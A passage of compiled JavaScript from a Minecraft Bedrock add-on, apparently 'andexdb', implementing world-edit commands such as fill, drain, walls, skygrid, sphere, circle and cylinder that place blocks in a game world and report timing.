                                            clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                        }
                                        ;
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, "air");
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "drain":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, "air", undefined, { matchingBlock: "water" });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "fill":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        if (replacemode) {
                                            clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                        }
                                        ;
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "keep":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: "air" });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "walls":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHW(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "hollow":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "outline":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHO(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "pillars":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHP(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "skygrid":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        fillBlocksHSGG(coordinatesa, coordinatesb, sgskygridsize, player.dimension, sgfirstblockname, sgfirstblockstates, { matchingBlock: sgmatchingblock[0], matchingBlockStates: sgmatchingblock[1], minMSBetweenYields: 5000 }, undefined, sgreplacemode, integrity).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "inverseskygrid":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        fillBlocksHISGG(coordinatesa, coordinatesb, sgskygridsize, player.dimension, sgfirstblockname, sgfirstblockstates, { matchingBlock: sgmatchingblock[0], matchingBlockStates: sgmatchingblock[1], minMSBetweenYields: 5000 }, undefined, sgreplacemode, integrity).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "tunnel":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "floor":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "ceilling":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "diamond":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "hollowovoid":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        fillBlocksHHOG(center, vTV3(Vector.subtract(horadi, { x: -0.5, y: -0.5, z: -0.5 })), hooffset, hothickness, player.dimension, hofirstblockname, hofirstblockstates, { matchingBlock: homatchingblock[0], matchingBlockStates: homatchingblock[1], minMSBetweenYields: 5000 }, undefined, horeplacemode, hointegrity).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "ovoid":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        fillBlocksHOG(center, vTV3(Vector.subtract(oradi, { x: -0.5, y: -0.5, z: -0.5 })), ooffset, player.dimension, ofirstblockname, ofirstblockstates, { matchingBlock: omatchingblock[0], matchingBlockStates: omatchingblock[1], minMSBetweenYields: 5000 }, undefined, oreplacemode, ointegrity).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "hollowsphere":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        fillBlocksHHSG(center, radius - 0.5, thickness, player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1], minMSBetweenYields: 5000 }, undefined, hsreplacemode, cintegrity).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "dome":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        fillBlocksHDG(center, radius - 0.5, thickness, player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1], minMSBetweenYields: 5000 }, undefined, hsreplacemode, cintegrity).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "sphere":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        fillBlocksHSG(center, radius - 0.5, player.dimension, ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1], minMSBetweenYields: 5000 }, undefined, ccreplacemode, cintegrity).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "semisphere":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        fillBlocksHSSG(center, radius - 0.5, player.dimension, ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1], minMSBetweenYields: 5000 }, undefined, ccreplacemode, cintegrity).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circle":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, axis, cfirstblockname, cfirstblockstates, { matchingBlock: cmatchingblock[0], matchingBlockStates: cmatchingblock[1] }, undefined, creplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlex":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "x", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circley":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "y", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlez":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "z", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlexy":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "xy", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circleyz":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "yz", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlexz":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "xz", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlexyz":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "xyz", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinder":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, taxis, player.dimension, tfirstblockname, tfirstblockstates, { matchingBlock: tmatchingblock[0], matchingBlockStates: tmatchingblock[1] }, undefined, treplacemode, tintegrity);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderx":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "x", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode, tintegrity);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylindery":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "y", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode, tintegrity);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderz":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "z", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode, tintegrity);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderxy":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
